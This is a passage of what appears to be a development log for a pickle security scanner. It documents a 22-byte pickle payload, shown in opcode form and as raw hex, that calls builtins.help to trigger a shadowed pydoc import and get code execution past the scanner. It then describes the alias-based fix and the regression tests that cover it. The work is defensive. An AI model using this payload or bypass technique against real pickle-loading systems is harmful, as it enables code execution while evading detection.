@@ -13338,3 +13338,171 @@ Performance note:
 - The inherited-method source-context fallback uses existing bounded source
   parsing and inherited-method limits.
 - Warm scan median for the fixed 67-byte payload was `0.000133s` over 50 runs.
+
+## Turn 227 - Bypass via `builtins.help` singleton call into `pydoc`
+
+Found a scanner-clean RCE-capable bypass in a builtin singleton object. The
+payload calls `builtins.help` with no arguments. At runtime `help` is a
+`_sitebuiltins._Helper` instance, so `REDUCE` enters
+`_Helper.__call__()`, which performs a function-body `import pydoc`. A shadow
+`pydoc.py` at the front of `sys.path` executes during `pickle.loads`.
+
+Payload shape:
+
+```text
+PROTO 4
+STACK_GLOBAL builtins help
+EMPTY_TUPLE
+REDUCE              # calls builtins.help(), i.e. _Helper.__call__()
+STOP
+```
+
+Raw payload:
+
+```text
+80048c086275696c74696e738c0468656c709329522e
+```
+
+Scanner proof:
+
+```text
+payload_len 22
+scan clean complete findings 0 errors ()
+import_refs (
+  {'module': 'builtins', 'name': 'help',
+   'import_reference': 'builtins.help', 'is_dangerous': False},
+)
+callable_invocations (
+  {'module': 'builtins', 'name': 'help',
+   'import_reference': 'builtins.help',
+   'opcode_position': 20, 'positional_arg_count': 0},
+)
+actual_dangerous ()
+helper_calls ('pydoc.help', 'builtins.__import__')
+hyp_dangerous (CallGraphFinding(module='_sitebuiltins',
+  name='_Helper.__call__', sink='builtins.__import__'),)
+```
+
+Runtime proof:
+
+```text
+runtime rc 0
+runtime stdout
+result 'fake-help'
+marker_exists True
+marker_text pydoc-owned
+
+runtime stderr
+```
+
+The child proof inserted a temporary module directory at the front of
+`sys.path`, removed `pydoc` from `sys.modules`, and ran `pickle.loads(payload)`.
+The shadow `pydoc.py` wrote the marker at import time and exposed a minimal
+`help()` function returning `"fake-help"`.
+
+Why it bypasses:
+
+- Native policy does not mark `builtins.help` as dangerous.
+- Native callable metadata records the reducer as `builtins.help`, but does not
+  know that the value is a `_sitebuiltins._Helper` instance.
+- The Python call graph can detect `_sitebuiltins._Helper.__call__` as reaching
+  `builtins.__import__` when that implementation method is named explicitly,
+  but there is no alias from `builtins.help` to the implementation method.
+- The payload contains no magic-method string and no direct `pydoc` reference.
+
+Likely source-level defense:
+
+- Add a finite builtin-singleton alias layer in native callable metadata or in
+  the Python call-graph reference normalization. When a reducer invokes
+  `builtins.help`, emit or normalize an additional invocation for
+  `_sitebuiltins._Helper.__call__` with the observed positional argument count.
+- Keep this close to the source: the problem is not package enumeration, it is
+  that pickle can call callable singleton objects whose implementation class is
+  hidden behind a benign-looking builtin name.
+- Consider the same treatment for other site-installed builtin singleton
+  objects (`license`, `credits`, `copyright`) after confirming their
+  implementation methods and side effects; `help` is the RCE-capable case
+  because it imports `pydoc` at call time.
+
+Performance note:
+
+- Payload size is 22 bytes.
+- Warm scan median over 100 runs was `0.000043s` with max `0.000050s`.
+- A targeted alias check would be constant-time and only applies to callable
+  invocations already recorded for builtin singleton names.
+
+## Turn 228 - Defense for `builtins.help` singleton call alias
+
+Implemented the source-level block for Turn 227 in the Python call-graph
+normalization layer. When native metadata shows that a pickle actually invoked
+`builtins.help`, the call graph now analyzes the hidden implementation method
+`_sitebuiltins._Helper.__call__` with the same observed positional argument
+count. A plain import reference to `builtins.help` remains clean.
+
+Fix details:
+
+- Added a small callable-singleton alias table for invoked singleton objects.
+- `_iter_callable_invocation_references()` now expands invoked `builtins.help`
+  into `_sitebuiltins._Helper.__call__`.
+- `_callable_invocation_positional_arg_counts()` mirrors the observed argument
+  count onto the alias, allowing the existing arity-aware function-body import
+  check to catch `_Helper.__call__()` importing `pydoc`.
+- The native metadata remains unchanged; this is a call-graph alias from the
+  visible singleton name to the implementation method.
+
+Regression coverage:
+
+- `test_call_graph_models_builtins_help_singleton_invocations` verifies that
+  `builtins.help` as an import reference is clean until callable invocation
+  metadata proves it was called, then reports `_sitebuiltins._Helper.__call__`
+  reaching `builtins.__import__`.
+- `test_scan_bytes_blocks_builtins_help_singleton_import_rce` scans the Turn
+  227 payload as malicious and executes it in a child interpreter with a shadow
+  `pydoc.py`.
+
+Post-fix proof:
+
+```text
+payload_len 22
+scan malicious complete findings 1
+call_graph [{'module': '_sitebuiltins',
+  'name': '_Helper.__call__',
+  'import_reference': '_sitebuiltins._Helper.__call__',
+  'sink': 'builtins.__import__',
+  'call_path': ('_sitebuiltins._Helper.__call__',
+                'builtins.__import__')}]
+metadata_invocations (
+  {'module': 'builtins', 'name': 'help',
+   'import_reference': 'builtins.help',
+   'opcode_position': 20, 'positional_arg_count': 0},
+)
+dangerous (CallGraphFinding(module='_sitebuiltins',
+  name='_Helper.__call__', sink='builtins.__import__'),)
+runtime rc 0
+runtime stdout
+result 'fake-help'
+marker_exists True
+marker_text pydoc-owned
+runtime stderr
+warm_median 0.000078
+warm_max 0.000084
+```
+
+Performance note:
+
+- The alias check is constant-time and only runs over already-recorded callable
+  invocations.
+- Warm scan median for the fixed 22-byte payload was `0.000078s` over 100
+  runs.
+
+Validation:
+
+- Focused import/call-graph regression file: `21 passed in 0.92s`.
+- Focused call-graph suite: `59 passed in 2.70s`.
+- Focused `click.utils.LazyFile` startup-hook regression: `1 passed in
+  1.31s`.
+- `ruff format`: `392 files left unchanged`.
+- `ruff check --fix`: `All checks passed!`.
+- `mypy`: `Success: no issues found in 447 source files`.
+- Full non-slow/non-integration validation:
+  `3736 passed, 1022 skipped, 21 warnings in 54.18s`.
